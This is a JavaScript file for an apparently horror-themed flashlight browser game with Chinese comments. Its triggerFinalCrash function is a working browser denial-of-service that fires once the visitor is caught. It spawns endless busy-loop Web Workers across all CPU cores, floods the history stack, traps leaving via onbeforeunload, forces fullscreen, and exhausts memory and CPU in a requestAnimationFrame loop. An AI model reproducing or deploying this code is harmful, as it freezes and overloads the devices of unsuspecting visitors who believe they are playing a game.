let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 橘色小點機制
function spawnSecretDot() {
    if (document.getElementById('secret-dot')) return;
    const dot = document.createElement('div');
    dot.id = 'secret-dot';
    dot.style.cssText = `
        position: absolute; width: 15px; height: 15px;
        background: #ff6600; border-radius: 50%;
        box-shadow: 0 0 15px #ff6600; cursor: pointer;
        z-index: 9999; left: 1500px; top: 1500px;
    `;
    dot.onclick = (e) => {
        e.stopPropagation();
        window.location.href = "https://achieve66.github.io/....../"; 
    };
    map.appendChild(dot);
}

// 2. 跨平台音頻啟動 (iOS 必備)
function startCreepyVoice() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.98; // 崩潰後全功率噪音
            } else {
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
    audioStarted = true;
}

// 3. 自動獵殺 (Glitch Block)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    glitchBlock.style.cssText = `
        position: fixed; width: 50px; height: 50px;
        background: white; z-index: 10001;
        box-shadow: 0 0 50px 15px white;
        transition: transform 0.05s linear; pointer-events: none;
    `;
    document.body.appendChild(glitchBlock);

    let curX = Math.random() * window.innerWidth;
    let curY = -100;
    
    const hunterInterval = setInterval(() => {
        if (systemCrashed) { clearInterval(hunterInterval); glitchBlock.remove(); return; }
        
        const dx = (window.innerWidth / 2) - (curX + 25);
        const dy = (window.innerHeight / 2) - (curY + 25);
        const dist = Math.sqrt(dx * dx + dy * dy);

        if (dist < 35) {
            triggerFinalCrash();
            clearInterval(hunterInterval);
        } else {
            curX += (dx / dist) * 5;
            curY += (dy / dist) * 5;
            glitchBlock.style.left = `${curX}px`;
            glitchBlock.style.top = `${curY}px`;
            glitchBlock.style.transform = `scale(${1 + (250 / dist)})`;
        }
    }, 16);
}, 25000);

// 4. 終極封鎖 (適用於 PC, Android, iOS, TV)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // 移除 UI 互動
    const dot = document.getElementById('secret-dot');
    if(dot) dot.remove();

    // 1. 鎖死捲動同手勢 (iOS Safari 關鍵)
    document.documentElement.style.overflow = 'hidden';
    document.body.style.overflow = 'hidden';
    document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

    // 2. 顯示死亡畫面
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; touch-action:none;">
            <h1 style="font-size:12vw; font-family:serif; text-shadow:0 0 40px red; text-align:center; word-break:keep-all;">나를 떠나지 마십시오.</h1>
        </div>
    `;

    // 3. 嘗試進入全螢幕
    const el = document.documentElement;
    const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fs) fs.call(el);

    // 4. 啟動背景壓力測試 (Worker Bomb)
    const workerCode = `while(true){ postMessage(Math.random()); }`;
    const workerBlob = new Blob([workerCode], {type: 'text/javascript'});
    const workerUrl = URL.createObjectURL(workerBlob);
    const threads = navigator.hardwareConcurrency || 8;
    for (let i = 0; i < threads * 2; i++) { new Worker(workerUrl); }

    // 5. 鎖死主線程 (The Hammer)
    setTimeout(() => {
        // 防止離開
        window.onbeforeunload = () => "STAY";
        
        function absoluteLock() {
            // 炸毀歷史紀錄
            for (let i = 0; i < 100; i++) {
                history.pushState(null, null, "#" + Math.random());
            }
            
            // 記憶體與 CPU 雙重打擊
            const heavy = new Array(800000).fill("SYSTEM_FAILURE").join("!!");
            JSON.parse(JSON.stringify(heavy)); 

            // 視覺 DOM 堆疊攻擊
            const l = document.createElement('div');
            l.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;z-index:99;backdrop-filter:blur(1px);`;
            document.getElementById('death-screen').appendChild(l);

            requestAnimationFrame(absoluteLock);
        }
        absoluteLock();
    }, 100);
}

// 5. 交互邏輯
function handleStart() {
    if (systemCrashed) return;
    startCreepyVoice();
    spawnSecretDot();
    intro.style.display = 'none';
    isLightOn = true;
    updateFlashlight();
}

window.addEventListener('mousemove', (e) => {
    mouseX = e.clientX; mouseY = e.clientY;
    updateFlashlight();
});

window.addEventListener('touchstart', (e) => {
    handleStart();
    if (!systemCrashed) {
        // iOS 觸控位移地圖邏輯
        posY += 40; 
        map.style.transform = `translate(${posX}px, ${posY}px)`;
    }
}, {passive: true});

window.addEventListener('mousedown', handleStart);

window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    handleStart();
    const key = e.key.toLowerCase();
    const speed = 70;
    if (key === 'w') posY += speed;
    if (key === 's') posY -= speed;
    if (key === 'a') posX += speed;
    if (key === 'd') posX -= speed;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});

function updateFlashlight() {
    if (isLightOn && !systemCrashed && overlay) {
        overlay.style.background = `radial-gradient(circle 150px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.98) 100%)`;
    }
}
